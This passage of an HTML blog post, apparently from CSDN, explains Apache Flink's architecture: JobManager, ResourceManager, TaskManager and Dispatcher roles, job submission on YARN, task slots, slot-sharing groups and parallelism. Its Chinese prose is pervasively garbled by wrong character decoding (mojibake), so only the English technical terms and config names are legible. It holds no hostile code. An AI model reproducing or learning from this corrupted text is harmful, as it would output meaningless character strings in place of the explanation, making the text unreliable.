graphï¼‰</li><li>æ‰“åŒ…äº†æ‰€æœ‰çš„ç±»ã€åº“å’Œå…¶å®ƒèµ„æºçš„JARåŒ…ã€‚</li></ul><pre><code>JobManagerä¼šæŠŠJobGraphè½¬æ¢æˆä¸€ä¸ªç‰©ç†å±‚é¢çš„æ•°æ®æµå›¾ï¼Œè¿™ä¸ªå›¾è¢«å«åšâ€œæ‰§è¡Œå›¾â€ï¼ˆExecutionGraphï¼‰ï¼ŒåŒ…å«äº†æ‰€æœ‰å¯ä»¥å¹¶å‘æ‰§è¡Œçš„ä»»åŠ¡ã€‚**JobManagerä¼šå‘èµ„æºç®¡ç†å™¨ï¼ˆResourceManagerï¼‰è¯·æ±‚æ‰§è¡Œä»»åŠ¡å¿…è¦çš„èµ„æºï¼Œä¹Ÿå°±æ˜¯ä»»åŠ¡ç®¡ç†å™¨ï¼ˆTaskManagerï¼‰ä¸Šçš„æ’æ§½ï¼ˆslotï¼‰ã€‚ä¸€æ—¦å®ƒè·å–åˆ°äº†è¶³å¤Ÿçš„èµ„æºï¼Œå°±ä¼šå°†æ‰§è¡Œå›¾åˆ†å‘åˆ°çœŸæ­£è¿è¡Œå®ƒä»¬çš„TaskManagerä¸Š**ã€‚åœ¨è¿è¡Œè¿‡ç¨‹ä¸­ï¼ŒJobManagerä¼šè´Ÿè´£æ‰€æœ‰éœ€è¦ä¸­å¤®åè°ƒçš„æ“ä½œï¼Œæ¯”å¦‚è¯´æ£€æŸ¥ç‚¹ï¼ˆcheckpointsï¼‰çš„åè°ƒã€‚</code></pre><h5 id="èµ„æºç®¡ç†å™¨ï¼ˆResourceManagerï¼‰"><a href="#èµ„æºç®¡ç†å™¨ï¼ˆResourceManagerï¼‰" class="headerlink" title="èµ„æºç®¡ç†å™¨ï¼ˆResourceManagerï¼‰"></a>èµ„æºç®¡ç†å™¨ï¼ˆResourceManagerï¼‰</h5><pre><code>ä¸»è¦è´Ÿè´£ç®¡ç†ä»»åŠ¡ç®¡ç†å™¨ï¼ˆTaskManagerï¼‰çš„æ’æ§½ï¼ˆslotï¼‰ï¼ŒTaskMangeræ’æ§½æ˜¯Flinkä¸­å®šä¹‰çš„å¤„ç†èµ„æºå•å…ƒã€‚Flinkä¸ºä¸åŒçš„ç¯å¢ƒå’Œèµ„æºç®¡ç†å·¥å…·æä¾›äº†ä¸åŒèµ„æºç®¡ç†å™¨ï¼Œæ¯”å¦‚YARNã€Mesosã€K8sï¼Œä»¥åŠstandaloneéƒ¨ç½²ã€‚**å½“JobManagerç”³è¯·æ’æ§½èµ„æºæ—¶ï¼ŒResourceManagerä¼šå°†æœ‰ç©ºé—²æ’æ§½çš„TaskManageråˆ†é…ç»™JobManager**ã€‚å¦‚æœResourceManageræ²¡æœ‰è¶³å¤Ÿçš„æ’æ§½æ¥æ»¡è¶³JobManagerçš„è¯·æ±‚ï¼Œå®ƒè¿˜å¯ä»¥å‘èµ„æºæä¾›å¹³å°å‘èµ·ä¼šè¯ï¼Œä»¥æä¾›å¯åŠ¨TaskManagerè¿›ç¨‹çš„å®¹å™¨ã€‚å¦å¤–ï¼Œ**ResourceManagerè¿˜è´Ÿè´£ç»ˆæ­¢ç©ºé—²çš„TaskManagerï¼Œé‡Šæ”¾è®¡ç®—èµ„æº**ã€‚</code></pre><h5 id="ä»»åŠ¡ç®¡ç†å™¨ï¼ˆTaskManagerï¼‰"><a href="#ä»»åŠ¡ç®¡ç†å™¨ï¼ˆTaskManagerï¼‰" class="headerlink" title="ä»»åŠ¡ç®¡ç†å™¨ï¼ˆTaskManagerï¼‰"></a>ä»»åŠ¡ç®¡ç†å™¨ï¼ˆTaskManagerï¼‰</h5><pre><code>Flinkä¸­çš„å·¥ä½œè¿›ç¨‹ã€‚é€šå¸¸åœ¨Flinkä¸­ä¼šæœ‰å¤šä¸ªTaskManagerè¿è¡Œï¼Œæ¯ä¸€ä¸ªTaskManageréƒ½åŒ…å«äº†ä¸€å®šæ•°é‡çš„æ’æ§½ï¼ˆslotsï¼‰ã€‚**æ’æ§½çš„æ•°é‡é™åˆ¶äº†TaskManagerèƒ½å¤Ÿæ‰§è¡Œçš„ä»»åŠ¡æ•°é‡**ã€‚å¯åŠ¨ä¹‹åï¼ŒTaskManagerä¼šå‘èµ„æºç®¡ç†å™¨æ³¨å†Œå®ƒçš„æ’æ§½ï¼›æ”¶åˆ°èµ„æºç®¡ç†å™¨çš„æŒ‡ä»¤åï¼ŒTaskManagerå°±ä¼šå°†ä¸€ä¸ªæˆ–è€…å¤šä¸ªæ’æ§½æä¾›ç»™JobManagerè°ƒç”¨ã€‚JobManagerå°±å¯ä»¥å‘æ’æ§½åˆ†é…ä»»åŠ¡ï¼ˆtasksï¼‰æ¥æ‰§è¡Œäº†ã€‚**åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œä¸€ä¸ªTaskManagerå¯ä»¥è·Ÿå…¶å®ƒè¿è¡ŒåŒä¸€åº”ç”¨ç¨‹åºçš„TaskManageräº¤æ¢æ•°æ®**ã€‚</code></pre><h5 id="åˆ†å‘å™¨ï¼ˆDispatcherï¼‰"><a href="#åˆ†å‘å™¨ï¼ˆDispatcherï¼‰" class="headerlink" title="åˆ†å‘å™¨ï¼ˆDispatcherï¼‰"></a>åˆ†å‘å™¨ï¼ˆDispatcherï¼‰</h5><pre><code>å¯ä»¥è·¨ä½œä¸šè¿è¡Œï¼Œå®ƒä¸ºåº”ç”¨æäº¤æä¾›äº†RESTæ¥å£ã€‚å½“ä¸€ä¸ªåº”ç”¨è¢«æäº¤æ‰§è¡Œæ—¶ï¼Œåˆ†å‘å™¨å°±ä¼šå¯åŠ¨å¹¶å°†åº”ç”¨ç§»äº¤ç»™ä¸€ä¸ªJobManagerã€‚ç”±äºæ˜¯RESTæ¥å£ï¼Œæ‰€ä»¥Dispatcherå¯ä»¥ä½œä¸ºé›†ç¾¤çš„ä¸€ä¸ªHTTPæ¥å…¥ç‚¹ï¼Œè¿™æ ·å°±èƒ½å¤Ÿä¸å—é˜²ç«å¢™é˜»æŒ¡ã€‚Dispatcherä¹Ÿä¼šå¯åŠ¨ä¸€ä¸ªWeb UIï¼Œç”¨æ¥æ–¹ä¾¿åœ°å±•ç¤ºå’Œç›‘æ§ä½œä¸šæ‰§è¡Œçš„ä¿¡æ¯ã€‚_Dispatcheråœ¨æ¶æ„ä¸­å¯èƒ½å¹¶ä¸æ˜¯å¿…éœ€çš„ï¼Œè¿™å–å†³äºåº”ç”¨æäº¤è¿è¡Œçš„æ–¹å¼ã€‚_</code></pre><h4 id="ä»»åŠ¡æäº¤æµç¨‹"><a href="#ä»»åŠ¡æäº¤æµç¨‹" class="headerlink" title="ä»»åŠ¡æäº¤æµç¨‹"></a>ä»»åŠ¡æäº¤æµç¨‹</h4><pre><code>æˆ‘ä»¬æ¥çœ‹çœ‹å½“ä¸€ä¸ªåº”ç”¨æäº¤æ‰§è¡Œæ—¶ï¼ŒFlinkçš„å„ä¸ªç»„ä»¶æ˜¯å¦‚ä½•äº¤äº’åä½œçš„ï¼š</code></pre><p><img src="https://img-blog.csdnimg.cn/20200524212126844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=JCsDl&originHeight=317&originWidth=1147&originalType=binary&ratio=1&status=done&style=none"></p><pre><code>_psï¼šä¸Šå›¾ä¸­7.æŒ‡TaskManagerä¸ºJobManageræä¾›slotsï¼Œ8.è¡¨ç¤ºJobManageræäº¤è¦åœ¨slotsä¸­æ‰§è¡Œçš„ä»»åŠ¡ç»™TaskManagerã€‚_ä¸Šå›¾æ˜¯ä»ä¸€ä¸ªè¾ƒä¸ºé«˜å±‚çº§çš„è§†è§’æ¥çœ‹åº”ç”¨ä¸­å„ç»„ä»¶çš„äº¤äº’åä½œã€‚å¦‚æœéƒ¨ç½²çš„é›†ç¾¤ç¯å¢ƒä¸åŒï¼ˆä¾‹å¦‚YARNï¼ŒMesosï¼ŒKubernetesï¼Œstandaloneç­‰ï¼‰ï¼Œå…¶ä¸­ä¸€äº›æ­¥éª¤å¯ä»¥è¢«çœç•¥ï¼Œæˆ–æ˜¯æœ‰äº›ç»„ä»¶ä¼šè¿è¡Œåœ¨åŒä¸€ä¸ªJVMè¿›ç¨‹ä¸­ã€‚å…·ä½“åœ°ï¼Œå¦‚æœæˆ‘ä»¬å°†Flinké›†ç¾¤éƒ¨ç½²åˆ°YARNä¸Šï¼Œé‚£ä¹ˆå°±ä¼šæœ‰å¦‚ä¸‹çš„æäº¤æµç¨‹ï¼š</code></pre><p><img src="https://img-blog.csdnimg.cn/20200524212247873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=UW7B0&originHeight=422&originWidth=854&originalType=binary&ratio=1&status=done&style=none"></p><ol><li>Flinkä»»åŠ¡æäº¤åï¼ŒClientå‘HDFSä¸Šä¼ Flinkçš„JaråŒ…å’Œé…ç½®</li><li>ä¹‹åå®¢æˆ·ç«¯å‘Yarn ResourceManageræäº¤ä»»åŠ¡ï¼ŒResourceManageråˆ†é…Containerèµ„æºå¹¶é€šçŸ¥å¯¹åº”çš„NodeManagerå¯åŠ¨ApplicationMaster</li><li>ApplicationMasterå¯åŠ¨ååŠ è½½Flinkçš„JaråŒ…å’Œé…ç½®æ„å»ºç¯å¢ƒï¼Œå»å¯åŠ¨JobManagerï¼Œä¹‹å<strong>JobManagerå‘Flinkè‡ªèº«çš„RMè¿›è¡Œç”³è¯·èµ„æºï¼Œè‡ªèº«çš„RMå‘Yarn çš„ResourceManagerç”³è¯·èµ„æº(å› ä¸ºæ˜¯yarnæ¨¡å¼ï¼Œæ‰€æœ‰èµ„æºå½’yarn RMç®¡ç†)å¯åŠ¨TaskManager</strong></li><li>Yarn ResourceManageråˆ†é…Containerèµ„æºåï¼Œç”±ApplicationMasteré€šçŸ¥èµ„æºæ‰€åœ¨èŠ‚ç‚¹çš„NodeManagerå¯åŠ¨TaskManager</li><li>NodeManageråŠ è½½Flinkçš„JaråŒ…å’Œé…ç½®æ„å»ºç¯å¢ƒå¹¶å¯åŠ¨TaskManagerï¼ŒTaskManagerå¯åŠ¨åå‘JobManagerå‘é€å¿ƒè·³åŒ…ï¼Œå¹¶ç­‰å¾…JobManagerå‘å…¶åˆ†é…ä»»åŠ¡ã€‚</li></ol><h4 id="ä»»åŠ¡è°ƒåº¦åŸç†"><a href="#ä»»åŠ¡è°ƒåº¦åŸç†" class="headerlink" title="ä»»åŠ¡è°ƒåº¦åŸç†"></a>ä»»åŠ¡è°ƒåº¦åŸç†</h4><p><img src="https://img-blog.csdnimg.cn/20200524213145755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=dggTa&originHeight=491&originWidth=730&originalType=binary&ratio=1&status=done&style=none"></p><ol><li> å®¢æˆ·ç«¯ä¸æ˜¯è¿è¡Œæ—¶å’Œç¨‹åºæ‰§è¡Œçš„ä¸€éƒ¨åˆ†ï¼Œä½†å®ƒç”¨äºå‡†å¤‡å¹¶å‘é€dataflow(JobGraph)ç»™Master(JobManager)ï¼Œç„¶åï¼Œå®¢æˆ·ç«¯æ–­å¼€è¿æ¥æˆ–è€…ç»´æŒè¿æ¥ä»¥ç­‰å¾…æ¥æ”¶è®¡ç®—ç»“æœã€‚è€ŒJob Managerä¼šäº§ç”Ÿä¸€ä¸ªæ‰§è¡Œå›¾(Dataflow Graph) </li><li> å½“ Flink é›†ç¾¤å¯åŠ¨åï¼Œé¦–å…ˆä¼šå¯åŠ¨ä¸€ä¸ª JobManger å’Œä¸€ä¸ªæˆ–å¤šä¸ªçš„ TaskManagerã€‚ç”± Client æäº¤ä»»åŠ¡ç»™ JobManagerï¼ŒJobManager å†è°ƒåº¦ä»»åŠ¡åˆ°å„ä¸ª TaskManager å»æ‰§è¡Œï¼Œç„¶å TaskManager å°†å¿ƒè·³å’Œç»Ÿè®¡ä¿¡æ¯æ±‡æŠ¥ç»™ JobManagerã€‚TaskManager ä¹‹é—´ä»¥æµçš„å½¢å¼è¿›è¡Œæ•°æ®çš„ä¼ è¾“ã€‚ä¸Šè¿°ä¸‰è€…å‡ä¸ºç‹¬ç«‹çš„ JVM è¿›ç¨‹ã€‚ </li><li> Client ä¸ºæäº¤ Job çš„å®¢æˆ·ç«¯ï¼Œå¯ä»¥æ˜¯è¿è¡Œåœ¨ä»»ä½•æœºå™¨ä¸Šï¼ˆä¸ JobManager ç¯å¢ƒè¿é€šå³å¯ï¼‰ã€‚æäº¤ Job åï¼ŒClient å¯ä»¥ç»“æŸè¿›ç¨‹ï¼ˆStreamingçš„ä»»åŠ¡ï¼‰ï¼Œä¹Ÿå¯ä»¥ä¸ç»“æŸå¹¶ç­‰å¾…ç»“æœè¿”å›ã€‚ </li><li> JobManager ä¸»è¦è´Ÿè´£è°ƒåº¦ Job å¹¶åè°ƒ Task åš checkpointï¼ŒèŒè´£ä¸Šå¾ˆåƒ Storm çš„ Nimbusã€‚ä» Client å¤„æ¥æ”¶åˆ° Job å’Œ JAR åŒ…ç­‰èµ„æºåï¼Œä¼šç”Ÿæˆä¼˜åŒ–åçš„æ‰§è¡Œè®¡åˆ’ï¼Œå¹¶ä»¥ Task çš„å•å…ƒè°ƒåº¦åˆ°å„ä¸ª TaskManager å»æ‰§è¡Œã€‚ </li><li> TaskManager åœ¨å¯åŠ¨çš„æ—¶å€™å°±è®¾ç½®å¥½äº†æ§½ä½æ•°ï¼ˆSlotï¼‰ï¼Œæ¯ä¸ª slot èƒ½å¯åŠ¨ä¸€ä¸ª Taskï¼ŒTask ä¸ºçº¿ç¨‹ã€‚ä» JobManager å¤„æ¥æ”¶éœ€è¦éƒ¨ç½²çš„ Taskï¼Œéƒ¨ç½²å¯åŠ¨åï¼Œä¸è‡ªå·±çš„ä¸Šæ¸¸å»ºç«‹ Netty è¿æ¥ï¼Œæ¥æ”¶æ•°æ®å¹¶å¤„ç†ã€‚<br><em>æ³¨ï¼šå¦‚æœä¸€ä¸ªSlotä¸­å¯åŠ¨å¤šä¸ªçº¿ç¨‹ï¼Œé‚£ä¹ˆè¿™å‡ ä¸ªçº¿ç¨‹ç±»ä¼¼CPUè°ƒåº¦ä¸€æ ·å…±ç”¨åŒä¸€ä¸ªslot</em> </li></ol><h5 id="TaskMangerä¸Slots"><a href="#TaskMangerä¸Slots" class="headerlink" title="TaskMangerä¸Slots"></a>TaskMangerä¸Slots</h5><p>è¦ç‚¹ï¼š</p><ul><li> è€ƒè™‘åˆ°Slotåˆ†ç»„ï¼Œæ‰€ä»¥å®é™…è¿è¡ŒJobæ—¶æ‰€éœ€çš„Slotæ€»æ•° = æ¯ä¸ªSlotç»„ä¸­çš„æœ€å¤§å¹¶è¡Œåº¦ã€‚<br>egï¼ˆ1ï¼Œ1ï¼Œ2ï¼Œ1ï¼‰,å…¶ä¸­ç¬¬ä¸€ä¸ªå½’ä¸ºç»„â€œredâ€ã€ç¬¬äºŒä¸ªå½’ç»„â€œblueâ€ã€ç¬¬ä¸‰ä¸ªå’Œç¬¬å››å½’ç»„â€œgreenâ€ï¼Œé‚£ä¹ˆè¿è¡Œæ‰€éœ€çš„slotå³maxï¼ˆ1ï¼‰+maxï¼ˆ1ï¼‰+maxï¼ˆ2ï¼Œ1ï¼‰ = Â 1+1+2 Â = 4 </li></ul><hr><p><img src="https://img-blog.csdnimg.cn/20200524213557113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=k2sK2&originHeight=242&originWidth=752&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>Flinkä¸­æ¯ä¸€ä¸ªworker(TaskManager)éƒ½æ˜¯ä¸€ä¸ª<strong>JVM</strong>è¿›ç¨‹ï¼Œå®ƒå¯èƒ½ä¼šåœ¨ç‹¬ç«‹çš„çº¿ç¨‹ä¸Šæ‰§è¡Œä¸€ä¸ªæˆ–å¤šä¸ªsubtaskã€‚</li><li>ä¸ºäº†æ§åˆ¶ä¸€ä¸ªworkerèƒ½æ¥æ”¶å¤šå°‘ä¸ªtaskï¼Œworkeré€šè¿‡task slotæ¥è¿›è¡Œæ§åˆ¶ï¼ˆä¸€ä¸ªworkerè‡³å°‘æœ‰ä¸€ä¸ªtask slotï¼‰ã€‚</li></ul><p><strong>ä¸Šå›¾è¿™ä¸ªæ¯ä¸ªå­ä»»åŠ¡å„è‡ªå ç”¨ä¸€ä¸ªslotï¼Œå¯ä»¥åœ¨ä»£ç ä¸­é€šè¿‡ç®—å­çš„</strong><code>**.slotSharingGroup(&quot;ç»„å&quot;)**</code>**æŒ‡å®šç®—å­æ‰€åœ¨çš„Slotç»„åï¼Œé»˜è®¤æ¯ä¸€ä¸ªç®—å­çš„SlotGroupå’Œä¸Šä¸€ä¸ªç®—å­ç›¸åŒï¼Œè€Œé»˜è®¤çš„SlotGroupå°±æ˜¯â€defaultâ€**ã€‚</p><p><strong>åŒä¸€ä¸ªSlotGroupçš„ç®—å­èƒ½å…±äº«åŒä¸€ä¸ªslotï¼Œä¸åŒç»„åˆ™å¿…é¡»å¦å¤–åˆ†é…ç‹¬ç«‹çš„Slotã€‚</strong></p><p><img src="https://img-blog.csdnimg.cn/20200524214555469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=C6Rqj&originHeight=336&originWidth=726&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>é»˜è®¤æƒ…å†µä¸‹ï¼ŒFlinkå…è®¸å­ä»»åŠ¡å…±äº«slotï¼Œå³ä½¿å®ƒä»¬æ˜¯ä¸åŒä»»åŠ¡çš„å­ä»»åŠ¡ï¼ˆå‰æéœ€è¦æ¥è‡ªåŒä¸€ä¸ªJobï¼‰ã€‚è¿™æ ·ç»“æœæ˜¯ï¼Œ<strong>ä¸€ä¸ªslotå¯ä»¥ä¿å­˜ä½œä¸šçš„æ•´ä¸ªç®¡é“pipeline</strong>ã€‚ <ul><li> <strong>ä¸åŒä»»åŠ¡å…±äº«åŒä¸€ä¸ªSlotçš„å‰æï¼šè¿™å‡ ä¸ªä»»åŠ¡å‰åé¡ºåºä¸åŒï¼Œå¦‚ä¸Šå›¾ä¸­Sourceå’ŒkeyByæ˜¯ä¸¤ä¸ªä¸åŒæ­¥éª¤é¡ºåºçš„ä»»åŠ¡ï¼Œæ‰€ä»¥å¯ä»¥åœ¨åŒä¸€ä¸ªSlotæ‰§è¡Œ</strong>ã€‚ </li><li>ä¸€ä¸ªslotå¯ä»¥ä¿å­˜ä½œä¸šçš„æ•´ä¸ªç®¡é“çš„å¥½å¤„ï¼š <ul><li>å¦‚æœæœ‰æŸä¸ªslotæ‰§è¡Œå®Œäº†æ•´ä¸ªä»»åŠ¡æµç¨‹ï¼Œé‚£ä¹ˆå…¶ä»–ä»»åŠ¡å°±å¯ä»¥ä¸ç”¨ç»§ç»­äº†ï¼Œè¿™æ ·ä¹Ÿçœå»äº†è·¨slotã€è·¨TaskManagerçš„é€šä¿¡æŸè€—ï¼ˆé™ä½äº†å¹¶è¡Œåº¦ï¼‰</li><li>åŒæ—¶slotèƒ½å¤Ÿä¿å­˜æ•´ä¸ªç®¡é“ï¼Œä½¿å¾—æ•´ä¸ªä»»åŠ¡æ‰§è¡Œå¥å£®æ€§æ›´é«˜ï¼Œå› ä¸ºæŸäº›slotæ‰§è¡Œå‡ºå¼‚å¸¸ä¹Ÿèƒ½æœ‰å…¶ä»–slotè¡¥ä¸Šã€‚</li><li>æœ‰äº›slotåˆ†é…åˆ°çš„å­ä»»åŠ¡éCPUå¯†é›†å‹ï¼Œæœ‰äº›åˆ™CPUå¯†é›†å‹ï¼Œå¦‚æœæ¯ä¸ªslotåªå®Œæˆè‡ªå·±çš„å­ä»»åŠ¡ï¼Œå°†å‡ºç°æŸäº›slotå¤ªé—²ï¼ŒæŸäº›slotè¿‡å¿™çš„ç°è±¡ã€‚</li></ul></li><li> <em>å‡è®¾æ‹†åˆ†çš„å¤šä¸ªSourceå­ä»»åŠ¡æ”¾åˆ°åŒä¸€ä¸ªSlotï¼Œé‚£ä¹ˆä»»åŠ¡ä¸èƒ½å¹¶è¡Œæ‰§è¡Œäº†=&gt;å› ä¸ºå¤šä¸ªç›¸åŒæ­¥éª¤çš„å­ä»»åŠ¡éœ€è¦æŠ¢å çš„å…·ä½“èµ„æºç›¸åŒï¼Œæ¯”å¦‚æŠ¢å æŸä¸ªé”ï¼Œè¿™æ ·å°±ä¸èƒ½å¹¶è¡Œã€‚</em> </li></ul></li><li> Task Slotæ˜¯é™æ€çš„æ¦‚å¿µï¼Œæ˜¯æŒ‡TaskManagerå…·æœ‰çš„å¹¶å‘æ‰§è¡Œèƒ½åŠ›ï¼Œå¯ä»¥é€šè¿‡å‚æ•°<code>taskmanager.numberOfTaskSlots</code>è¿›è¡Œé…ç½®ã€‚<br><em>è€Œå¹¶è¡Œåº¦<strong>parallelism</strong>æ˜¯åŠ¨æ€æ¦‚å¿µï¼Œå³<strong>TaskManager</strong>è¿è¡Œç¨‹åºæ—¶å®é™…ä½¿ç”¨çš„å¹¶å‘èƒ½åŠ›ï¼Œå¯ä»¥é€šè¿‡å‚æ•°</em><code>_parallelism.default_</code><em>è¿›è¡Œé…ç½®ã€‚</em> </li></ul><pre><code>æ¯ä¸ªtask slotè¡¨ç¤ºTaskManageræ‹¥æœ‰èµ„æºçš„ä¸€ä¸ªå›ºå®šå¤§å°çš„å­é›†ã€‚å‡å¦‚ä¸€ä¸ªTaskManageræœ‰ä¸‰ä¸ªslotï¼Œé‚£ä¹ˆå®ƒä¼šå°†å…¶ç®¡ç†çš„å†…å­˜åˆ†æˆä¸‰ä»½ç»™å„ä¸ªslotã€‚èµ„æºslotåŒ–æ„å‘³ç€ä¸€ä¸ªsubtaskå°†ä¸éœ€è¦è·Ÿæ¥è‡ªå…¶ä»–jobçš„subtaskç«äº‰è¢«ç®¡ç†çš„å†…å­˜ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯å®ƒå°†æ‹¥æœ‰ä¸€å®šæ•°é‡çš„å†…å­˜å‚¨å¤‡ã€‚**éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œä¸ä¼šæ¶‰åŠåˆ°CPUçš„éš”ç¦»ï¼Œslotç›®å‰ä»…ä»…ç”¨æ¥éš”ç¦»taskçš„å—ç®¡ç†çš„å†…å­˜**ã€‚é€šè¿‡è°ƒæ•´task slotçš„æ•°é‡ï¼Œå…è®¸ç”¨æˆ·å®šä¹‰subtaskä¹‹é—´å¦‚ä½•äº’ç›¸éš”ç¦»ã€‚å¦‚æœä¸€ä¸ªTaskManagerä¸€ä¸ªslotï¼Œé‚£å°†æ„å‘³ç€æ¯ä¸ªtask groupè¿è¡Œåœ¨ç‹¬ç«‹çš„JVMä¸­ï¼ˆè¯¥JVMå¯èƒ½æ˜¯é€šè¿‡ä¸€ä¸ªç‰¹å®šçš„å®¹å™¨å¯åŠ¨çš„ï¼‰ï¼Œè€Œä¸€ä¸ªTaskManagerå¤šä¸ªslotæ„å‘³ç€æ›´å¤šçš„subtaskå¯ä»¥å…±äº«åŒä¸€ä¸ªJVMã€‚è€Œåœ¨åŒä¸€ä¸ªJVMè¿›ç¨‹ä¸­çš„taskå°†å…±äº«TCPè¿æ¥ï¼ˆåŸºäºå¤šè·¯å¤ç”¨ï¼‰å’Œå¿ƒè·³æ¶ˆæ¯ã€‚å®ƒä»¬ä¹Ÿå¯èƒ½å…±äº«æ•°æ®é›†å’Œæ•°æ®ç»“æ„ï¼Œå› æ­¤è¿™å‡å°‘äº†æ¯ä¸ªtaskçš„è´Ÿè½½ã€‚</code></pre><h5 id="Slotå’Œå¹¶è¡Œåº¦"><a href="#Slotå’Œå¹¶è¡Œåº¦" class="headerlink" title="Slotå’Œå¹¶è¡Œåº¦"></a>Slotå’Œå¹¶è¡Œåº¦</h5><ol><li><strong>ä¸€ä¸ªç‰¹å®šç®—å­çš„ å­ä»»åŠ¡ï¼ˆsubtaskï¼‰çš„ä¸ªæ•°è¢«ç§°ä¹‹ä¸ºå…¶å¹¶è¡Œåº¦ï¼ˆparallelismï¼‰</strong>ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹å•ç‹¬çš„æ¯ä¸ªç®—å­è¿›è¡Œè®¾ç½®å¹¶è¡Œåº¦ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ç”¨envè®¾ç½®å…¨å±€çš„å¹¶è¡Œåº¦ï¼Œæ›´å¯ä»¥åœ¨é¡µé¢ä¸­å»æŒ‡å®šå¹¶è¡Œåº¦ã€‚</li><li>æœ€åï¼Œç”±äºå¹¶è¡Œåº¦æ˜¯å®é™…Task Managerå¤„ç†task çš„èƒ½åŠ›ï¼Œè€Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œ<strong>ä¸€ä¸ª stream çš„å¹¶è¡Œåº¦ï¼Œå¯ä»¥è®¤ä¸ºå°±æ˜¯å…¶æ‰€æœ‰ç®—å­ä¸­æœ€å¤§çš„å¹¶è¡Œåº¦</strong>ï¼Œåˆ™å¯ä»¥å¾—å‡º<strong>åœ¨è®¾ç½®Slotæ—¶ï¼Œåœ¨æ‰€æœ‰è®¾ç½®ä¸­çš„æœ€å¤§è®¾ç½®çš„å¹¶è¡Œåº¦å¤§å°åˆ™å°±æ˜¯æ‰€éœ€è¦è®¾ç½®çš„Slotçš„æ•°é‡ã€‚</strong>ï¼ˆå¦‚æœSlotåˆ†ç»„ï¼Œåˆ™éœ€è¦ä¸ºæ¯ç»„Slotå¹¶è¡Œåº¦æœ€å¤§å€¼çš„å’Œï¼‰</li></ol><p><img src="https://img-blog.csdnimg.cn/20200524215554488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=MN4uP&originHeight=361&originWidth=543&originalType=binary&ratio=1&status=done&style=none"></p><p><img src="https://img-blog.csdnimg.cn/2020052421520496.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=Qa8pF&originHeight=605&originWidth=665&originalType=binary&ratio=1&status=done&style=none"></p><p><img src="https://img-blog.csdnimg.cn/20200524215251380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=HhvA4&originHeight=446&originWidth=718&originalType=binary&ratio=1&status=done&style=none"></p><pre><code>å‡è®¾ä¸€å…±æœ‰3ä¸ªTaskManagerï¼Œæ¯ä¸€ä¸ªTaskManagerä¸­çš„åˆ†é…3ä¸ªTaskSlotï¼Œä¹Ÿå°±æ˜¯æ¯ä¸ªTaskManagerå¯ä»¥æ¥æ”¶3ä¸ªtaskï¼Œä¸€å…±9ä¸ªTaskSlotï¼Œå¦‚æœæˆ‘ä»¬è®¾ç½®`parallelism.default=1`ï¼Œå³è¿è¡Œç¨‹åºé»˜è®¤çš„å¹¶è¡Œåº¦ä¸º1ï¼Œ9ä¸ªTaskSlotåªç”¨äº†1ä¸ªï¼Œæœ‰8ä¸ªç©ºé—²ï¼Œå› æ­¤ï¼Œè®¾ç½®åˆé€‚çš„å¹¶è¡Œåº¦æ‰èƒ½æé«˜æ•ˆç‡ã€‚_psï¼šä¸Šå›¾æœ€åä¸€ä¸ªå› ä¸ºæ˜¯è¾“å‡ºåˆ°æ–‡ä»¶ï¼Œé¿å…å¤šä¸ªSlotï¼ˆå¤šçº¿ç¨‹ï¼‰é‡Œçš„ç®—å­éƒ½è¾“å‡ºåˆ°åŒä¸€ä¸ªæ–‡ä»¶äº’ç›¸è¦†ç›–ç­‰æ··ä¹±é—®é¢˜ï¼Œç›´æ¥è®¾ç½®sinkçš„å¹¶è¡Œåº¦ä¸º1ã€‚_</code></pre><h5 id="ç¨‹åºå’Œæ•°æ®æµï¼ˆDataFlowï¼‰"><a href="#ç¨‹åºå’Œæ•°æ®æµï¼ˆDataFlowï¼‰" class="headerlink" title="ç¨‹åºå’Œæ•°æ®æµï¼ˆDataFlowï¼‰"></a>ç¨‹åºå’Œæ•°æ®æµï¼ˆDataFlowï¼‰</h5><p><img src="https://img-blog.csdnimg.cn/20200524215944234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=Y3olq&originHeight=420&originWidth=622&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> <strong>æ‰€æœ‰çš„Flinkç¨‹åºéƒ½æ˜¯ç”±ä¸‰éƒ¨åˆ†ç»„æˆçš„ï¼š Source ã€Transformation å’Œ Sinkã€‚</strong> </li><li> Source è´Ÿè´£è¯»å–æ•°æ®æºï¼ŒTransformation 